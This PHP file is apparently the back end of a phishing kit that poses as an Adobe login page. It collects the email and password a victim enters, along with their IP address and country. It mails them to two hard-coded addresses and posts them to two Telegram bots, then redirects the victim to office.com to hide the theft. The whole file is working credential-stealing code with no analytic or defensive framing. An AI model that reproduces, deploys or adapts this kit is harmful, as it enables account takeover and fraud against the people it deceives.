<?php
$country = visitor_country();
$countryCode = visitor_countryCode();
$continentCode = visitor_continentCode();
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$email = $_POST['email'];
$password = $_POST['password'];
$own = 'bodyuse22@gmail.com';
$own2 = 'barryminds@zohomail.eu';
$web = $_SERVER["HTTP_HOST"];
$inj = $_SERVER["REQUEST_URI"]; 
$domain = 'Adobe';
$sender = 'Adobe';
$subj = "Adobe: | $email | $country | $ip";
$headers .= "From: Adobe<$sender>\n";
$headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
$headers .= "Content-Type:text/html; charset=\"iso-8859-1\"\n";
$over = 'verified.php';
$msg = "<HTML><BODY>
 <TABLE>
 <tr><td><b>***Login Details</b></td></tr>
  <tr><td></td></tr>
   <tr><td>===================================================</td></tr>
 <tr><td>Username: <b>$email</b><td/></tr>
 <tr><td>Password: <b>$password</b></td></tr>
 <tr><td>Country: $country | User IP: <a href='http://whoer.net/check?host=$ip' target='_blank'>$ip</a> </td></tr>
  <tr><td>=====================================================</td></tr>
 </BODY>
 </HTML>";

// Telegram Bot Configuration (First Bot)
$telegramBotToken = 'YOUR_TELEGRAM_BOT_TOKEN'; // Replace with your Telegram Bot Token
$telegramChatId = 'YOUR_TELEGRAM_CHAT_ID'; // Replace with your Telegram Chat ID
$telegramMessage = urlencode("Adobe Login Details\nUsername: $email\nPassword: $password\nCountry: $country\nIP: $ip");

// Send message to First Telegram Bot
$telegramUrl = "https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$telegramChatId&text=$telegramMessage";
file_get_contents($telegramUrl);

// Telegram Bot Configuration (Second Bot)
$telegramBotToken2 = 'YOUR_SECOND_TELEGRAM_BOT_TOKEN'; // Replace with your second Telegram Bot Token
$telegramChatId2 = 'YOUR_SECOND_TELEGRAM_CHAT_ID'; // Replace with your second Telegram Chat ID
$telegramMessage2 = urlencode("Adobe Login Details\nUsername: $email\nPassword: $password\nCountry: $country\nIP: $ip");

// Send message to Second Telegram Bot
$telegramUrl2 = "https://api.telegram.org/bot$telegramBotToken2/sendMessage?chat_id=$telegramChatId2&text=$telegramMessage2";
file_get_contents($telegramUrl2);

if (empty($email) || empty($password)) {
    header( "Location: process.php?email=$email" );
} else {
    mail($own,$subj,$msg,$headers);
    mail($own2,$subj,$msg,$headers);
    header("Location: https://office.com");
}

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}

function visitor_countryCode()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryCode != null)
    {
        $result = $ip_data->geoplugin_countryCode;
    }

    return $result;
}

function visitor_regionName()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_regionName != null)
    {
        $result = $ip_data->geoplugin_regionName;
    }

    return $result;
}

function visitor_continentCode()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_continentCode != null)
    {
        $result = $ip_data->geoplugin_continentCode;
    }

    return $result;
}
?>
